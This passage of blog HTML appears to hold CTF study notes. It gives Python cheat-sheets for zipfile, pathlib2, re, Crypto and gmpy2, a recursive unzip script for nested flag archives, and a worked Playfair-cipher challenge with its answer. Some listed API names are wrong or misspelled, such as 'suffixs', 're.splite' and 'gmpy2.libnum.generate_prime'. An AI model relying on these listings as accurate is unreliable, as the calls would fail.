pwd是包密码</span><br><span class="line"> file.extract(member, path=<span class="literal">None</span>, pwd=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="filelib2库"><a href="#filelib2库" class="headerlink" title="filelib2库"></a>filelib2库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib2 <span class="keyword">import</span> Path               导入模块</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用的文件名操作属性</span></span><br><span class="line">file_path = Path(<span class="string">&#x27;addr&#x27;</span>)			  <span class="comment">#可以传多个字符串，会自动拼接</span></span><br><span class="line">file_path.suffix                        <span class="comment">#返回目录中最后一个部分的扩展名</span></span><br><span class="line">file_path.suffixs                       <span class="comment">#返回目录中多个扩展名列表</span></span><br><span class="line">file_path.stem                          <span class="comment">#返回目录中最后一部分的文件名，不包含后缀</span></span><br><span class="line">file_path.name                          <span class="comment">#返回目录中最后一部分的文件名，包含后缀</span></span><br><span class="line">file_path.with_name(<span class="string">&#x27;n_addr&#x27;</span>) 		   <span class="comment">#替换目录最后一个部分的文件名并返回一个新的路径</span></span><br><span class="line">file_path.with_suffix(<span class="string">&#x27;.txt&#x27;</span>)           <span class="comment">#替换目录最后一个部分的文件名后缀并返回一个新的路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建和删除文件夹</span></span><br><span class="line">file_path.mkdir()					 <span class="comment">#创建文件目录</span></span><br><span class="line">file_path.rmdir()                       <span class="comment">#删除目录，如果要删除的文件夹内包含文件就会报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断文件夹和文件是否存在</span></span><br><span class="line">file_path.is_dir()                      <span class="comment">#判断是否为目录</span></span><br><span class="line">file_path.is_file()                     <span class="comment">#判断是否为文件</span></span><br><span class="line">file_path.is_symlink()                  <span class="comment">#判断是否是软链接</span></span><br><span class="line">file_path.is_socket()                   <span class="comment">#判断是否为socket文件</span></span><br><span class="line">file_path.is_absolute()                 <span class="comment">#判断是否是绝对路径</span></span><br><span class="line">file_path.resolve()                     <span class="comment">#返回一个新的路径，这个新路径就是当前Path对象的绝对路径，如果是软链接则直接被解析</span></span><br><span class="line">file_path.exists()                      <span class="comment">#判断该路径是否存在</span></span><br></pre></td></tr></table></figure>
-
-<p>os接口可以看一下这里<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/os.html?highlight=os#module-os">os</a></p>
-<h3 id="综合-1"><a href="#综合-1" class="headerlink" title="综合"></a>综合</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unzip_file</span>(<span class="params">zip_src, dst_dir</span>):</span><br><span class="line">    r = zipfile.is_zipfile(zip_src)</span><br><span class="line">    <span class="keyword">if</span> r:</span><br><span class="line">        fz = zipfile.ZipFile(zip_src, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> fz.namelist():</span><br><span class="line">            <span class="keyword">if</span> pathlib.Path(file).suffix == <span class="string">&#x27;.zip&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(os.path.join(dst_dir, file), os.path.join(dst_dir, pathlib.Path(file).parent))</span><br><span class="line">                unzip_file(os.path.join(dst_dir, file), os.path.join(dst_dir, pathlib.Path(file).parent))</span><br><span class="line">            fz.extract(file, dst_dir)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;This is not zip&#x27;</span>)</span><br><span class="line"></span><br><span class="line">n=<span class="number">233</span></span><br><span class="line"><span class="keyword">while</span> n&gt;<span class="number">1</span>:</span><br><span class="line">    adders=<span class="string">&quot;C:\\Users\\lggt2\\Desktop\\flag&quot;</span></span><br><span class="line">    adders=adders+<span class="string">&#x27;\\&#x27;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot;.zip&quot;</span></span><br><span class="line">    unzip_file(adders, <span class="string">r&quot;C:\Users\lggt2\Desktop\flag&quot;</span>)</span><br><span class="line">    n-=<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="对流量包的处理"><a href="#对流量包的处理" class="headerlink" title="对流量包的处理"></a>对流量包的处理</h2><h3 id="re库"><a href="#re库" class="headerlink" title="re库"></a>re库</h3><p>python中正则匹配的库</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">search(pattern,string ,flags=<span class="number">0</span>)				<span class="comment">#在一个字符串中匹配正则表达式的第一个位置，返回match对象</span></span><br><span class="line">			pattern：正则表达式的字符串或原生字符串</span><br><span class="line">			string：待匹配字符串</span><br><span class="line">			flags:正则表达式使用时的控制标记</span><br><span class="line">re.<span class="keyword">match</span>(pattern,string ,flags=<span class="number">0</span>)			<span class="comment">#从一个字符串的开始位置起匹配正则表达式，返回match对象</span></span><br><span class="line"></span><br><span class="line">re.findall(pattern,string ,flags=<span class="number">0</span>)			<span class="comment">#搜索字符串，以列表类型返回全部匹配的子串</span></span><br><span class="line"></span><br><span class="line">re.splite(pattern,string ,maxsplit)			<span class="comment">#将一个字符串按照正则表达式匹配结果分割，返回列表类型</span></span><br><span class="line">		maxsplit:最大分割数，剩余部分作为最后一个元素输出</span><br><span class="line">re.finditer(pattern,string )				<span class="comment">#搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</span></span><br><span class="line">re.sub(pattern,repl,string ,count=<span class="number">0</span>)		 <span class="comment">#在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="在Crypto中的应用"><a href="#在Crypto中的应用" class="headerlink" title="在Crypto中的应用"></a>在Crypto中的应用</h2><h3 id="Crypto库"><a href="#Crypto库" class="headerlink" title="Crypto库"></a>Crypto库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bytes_to_long(s)                <span class="comment">#字节转换为long型整数</span></span><br><span class="line">long_to_bytes(long)             <span class="comment">#long型整数转换为字节</span></span><br><span class="line">getPrime(bits)                  <span class="comment">#生成长度为bits的素数</span></span><br><span class="line">getRandomInteger(bits)          <span class="comment">#生成长度小于bits的随机数</span></span><br><span class="line">getRandomNBitInteger(bits)      <span class="comment">#生成长度为bits的随机数</span></span><br><span class="line">getRandomNumber(bits)           <span class="comment">#生成长度不超过bits的随机数</span></span><br><span class="line">getRandomRange(<span class="built_in">min</span>,<span class="built_in">max</span>)         <span class="comment">#生成min与max之间的随机数</span></span><br><span class="line">inverse(a,b)                    <span class="comment">#计算a在b下的模逆元</span></span><br><span class="line">isPrime(num)                    <span class="comment">#判断num是否为素数</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="gmpy2库"><a href="#gmpy2库" class="headerlink" title="gmpy2库"></a>gmpy2库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gmpy2.gcd(a, b)                 <span class="comment">#求a,b的最大公约数</span></span><br><span class="line">gmpy2.lcm(a，b)                 <span class="comment">#求a,b的最小公倍数</span></span><br><span class="line">gmpy2.gcdext(a,b)               <span class="comment">#扩展欧几里得 返回g,x,y使得ax+by=g,(a,b互素时g为1)</span></span><br><span class="line">gmpy2.iroot(num,x)              <span class="comment">#num开x次方根</span></span><br><span class="line">gmpy2.libnum.generate_prime(<span class="number">4</span>)  <span class="comment">#生成素数</span></span><br><span class="line">gmpy2.next_prime()              <span class="comment">#相邻的下一个素数</span></span><br><span class="line">gmpy2.is_prime()                <span class="comment">#判断是否为素数</span></span><br><span class="line">gmpy2.powmod(a, n, p)           <span class="comment">#计算a**n mod p</span></span><br><span class="line">gmpy2.invert(a, b)              <span class="comment">#模逆元</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h3>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-Playfire密码" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/06/01/Playfire%E5%AF%86%E7%A0%81/" class="article-date">
-  	<time datetime="2023-06-01T03:08:58.219Z" itemprop="datePublished">2023-06-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Playfire密码"><a href="#Playfire密码" class="headerlink" title="Playfire密码"></a>Playfire密码</h1><blockquote>
-<p>还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag{} 提交, flag{小写字母}</p>
-</blockquote>
-<p>Playfair密码（Playfair cipher 或 Playfair square）一种替换密码，1854年由查尔斯·惠斯通（Charles Wheatstone）的英国人发明。</p>
-<h2 id="编制密码表"><a href="#编制密码表" class="headerlink" title="编制密码表"></a>编制密码表</h2><p>编一个55的密码表，共有5行5列字母。第一列（或第一行）是密钥,其余按照字母顺序，如果密钥过长可占用第二列或行。密钥是一个单词或词组，若有重复字母，可将后面重复的字母去掉。当然也要把使用频率最少的字母去掉（它依据一个55的正方形组成的密码表来编写，密码表里排列有25个字母。如果一种语言字母超过25个，可以去掉使用频率最少的一个。如，法语一般去掉w或k，德语则是把i和j合起来当成一个字母看待，英语中z使用最少，可以去掉它）。<br>密钥是playfair，去掉重复的后为playfir<br>密码表为<br><img src="/./assets/20200426123013318.png"></p>
-<h2 id="整理明文-x2F-密文"><a href="#整理明文-x2F-密文" class="headerlink" title="整理明文&#x2F;密文"></a>整理明文&#x2F;密文</h2><p>整理明文&#x2F;密文，将明文&#x2F;密文每两个字母组成一对。如果成对后有两个相同字母紧挨或最后一个字母是单个的，就插入一个字母X（或者Q）。<br>密文：Dncnoqqfliqrpgeklwmppu<br>Dn cn oq qf li qr pg ek lw mp pu</p>
-<h2 id="解密规则"><a href="#解密规则" class="headerlink" title="解密规则"></a>解密规则</h2><p>（1） 若c1 c2在同一行，对应明文p1 p2分别是紧靠c1 c2 左端的字母。其中最后一列被看做是第一列的左方。<br>（2） 若c1 c2在同一列，对应明文p1 p2分别是紧靠c1 c2 上方的字母。其中最后一行被看做是第一行的上方。<br>（3）若c1 c2不在同一行，不在同一列，则p1 p2是由c1 c2确定的矩形的其他两角的字母。<br>密文 ：Dn cn oq qf li qr pg ek lw mp pu<br>明文： it is no ta pr ob le mh ve ef un</p>
-<h2 id="加密规则"><a href="#加密规则" class="headerlink" title="加密规则"></a>加密规则</h2><p>（1）若p1 p2在同一行，对应密文c1 c2分别是紧靠p1 p2 右端的字母。其中第一列被看做是最后一列的右方。如，按照前表，fg对应gj，mr对应om<br>（2） 若p1 p2在同一列，对应密文c1 c2分别是紧靠p1 p2 下方的字母。其中第一行被看做是最后一行的下方。<br>（3）若p1 p2不在同一行，不在同一列，则c1 c2是由p1 p2确定的矩形的其他两角的字母（至于横向替换还是纵向替换要事先约好，或自行尝试）。如，按照前表，ir对应pa或ap。</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-  
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
-    </nav>
   
 </div>
       <footer id="footer">
